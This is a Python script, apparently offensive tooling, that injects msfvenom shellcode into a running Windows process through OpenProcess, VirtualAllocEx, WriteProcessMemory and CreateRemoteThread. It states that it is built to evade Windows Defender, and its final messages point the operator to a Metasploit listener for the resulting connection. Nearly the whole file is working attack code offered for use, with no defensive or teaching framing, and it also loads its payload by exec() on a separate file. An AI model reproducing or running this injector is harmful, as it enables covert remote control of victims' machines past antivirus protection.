#!/usr/bin/env python3
"""
Process Injection Script for Windows Defender Evasion
Injects shellcode into legitimate Windows processes
"""

import sys
import ctypes
import ctypes.wintypes
import subprocess
import time

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

def get_process_pid(process_name):
    """Get PID of a running process by name"""
    try:
        cmd = f'tasklist /FI "IMAGENAME eq {process_name}" /FO CSV'
        result = subprocess.check_output(cmd, shell=True).decode('utf-8')
        lines = result.strip().split('\n')
        
        if len(lines) > 1:
            # Parse CSV output to get PID
            for line in lines[1:]:
                parts = line.split('","')
                if len(parts) >= 2:
                    pid = int(parts[1].replace('"', ''))
                    return pid
    except Exception as e:
        print(f"[-] Error finding process {process_name}: {str(e)}")
    
    return None

def inject_shellcode(pid, shellcode):
    """Inject shellcode into target process"""
    try:
        # Load Windows DLLs
        kernel32 = ctypes.windll.kernel32
        
        print(f"[*] Opening process with PID: {pid}")
        
        # Open target process
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process_handle:
            print(f"[-] Failed to open process. Error code: {kernel32.GetLastError()}")
            return False
        
        print(f"[+] Process handle obtained: 0x{process_handle:X}")
        
        # Allocate memory in target process
        shellcode_size = len(shellcode)
        print(f"[*] Allocating {shellcode_size} bytes in target process...")
        
        allocated_memory = kernel32.VirtualAllocEx(
            process_handle,
            0,
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if not allocated_memory:
            print(f"[-] Failed to allocate memory. Error code: {kernel32.GetLastError()}")
            kernel32.CloseHandle(process_handle)
            return False
        
        print(f"[+] Memory allocated at: 0x{allocated_memory:X}")
        
        # Write shellcode to allocated memory
        print("[*] Writing shellcode to target process...")
        bytes_written = ctypes.c_size_t(0)
        
        result = kernel32.WriteProcessMemory(
            process_handle,
            allocated_memory,
            shellcode,
            shellcode_size,
            ctypes.byref(bytes_written)
        )
        
        if not result:
            print(f"[-] Failed to write shellcode. Error code: {kernel32.GetLastError()}")
            kernel32.CloseHandle(process_handle)
            return False
        
        print(f"[+] {bytes_written.value} bytes written")
        
        # Create remote thread to execute shellcode
        print("[*] Creating remote thread...")
        thread_id = ctypes.c_ulong(0)
        
        thread_handle = kernel32.CreateRemoteThread(
            process_handle,
            None,
            0,
            allocated_memory,
            None,
            0,
            ctypes.byref(thread_id)
        )
        
        if not thread_handle:
            print(f"[-] Failed to create remote thread. Error code: {kernel32.GetLastError()}")
            kernel32.CloseHandle(process_handle)
            return False
        
        print(f"[+] Remote thread created with ID: {thread_id.value}")
        print("[+] Shellcode injection successful!")
        
        # Clean up handles
        kernel32.CloseHandle(thread_handle)
        kernel32.CloseHandle(process_handle)
        
        return True
        
    except Exception as e:
        print(f"[-] Injection error: {str(e)}")
        return False

def load_shellcode_from_file(filename):
    """Load shellcode from msfvenom Python output"""
    try:
        # Read the Python file and extract shellcode variable
        with open(filename, 'r') as f:
            content = f.read()
        
        # Execute the file content to get the shellcode variable
        exec_globals = {}
        exec(content, exec_globals)
        
        if 'shellcode' in exec_globals:
            return exec_globals['shellcode']
        else:
            print("[-] Shellcode variable not found in file")
            return None
            
    except Exception as e:
        print(f"[-] Error loading shellcode: {str(e)}")
        return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 process_injector.py <target_process>")
        print("Example: python3 process_injector.py notepad.exe")
        print("\nNote: shellcode.py must exist in current directory")
        sys.exit(1)
    
    target_process = sys.argv[1]
    
    print(f"\n=== Process Injection Tool ===")
    print(f"[*] Target process: {target_process}")
    
    # Load shellcode
    print("[*] Loading shellcode from shellcode.py...")
    shellcode = load_shellcode_from_file("shellcode.py")
    
    if not shellcode:
        print("[-] Failed to load shellcode")
        sys.exit(1)
    
    print(f"[+] Shellcode loaded: {len(shellcode)} bytes")
    
    # Check if target process exists, if not start it
    pid = get_process_pid(target_process)
    
    if not pid:
        print(f"[*] Process {target_process} not running, starting it...")
        try:
            subprocess.Popen(target_process, shell=True)
            time.sleep(2)  # Wait for process to start
            pid = get_process_pid(target_process)
        except:
            print(f"[-] Failed to start {target_process}")
            sys.exit(1)
    
    if not pid:
        print(f"[-] Could not find or start process: {target_process}")
        sys.exit(1)
    
    print(f"[+] Found target process with PID: {pid}")
    
    # Perform injection
    print("\n[*] Starting injection...")
    if inject_shellcode(pid, shellcode):
        print("\n[+] SUCCESS: Shellcode injected successfully!")
        print("[!] Check your Metasploit listener for connection")
        print("[!] Windows Defender should NOT have detected this")
    else:
        print("\n[-] FAILED: Injection failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
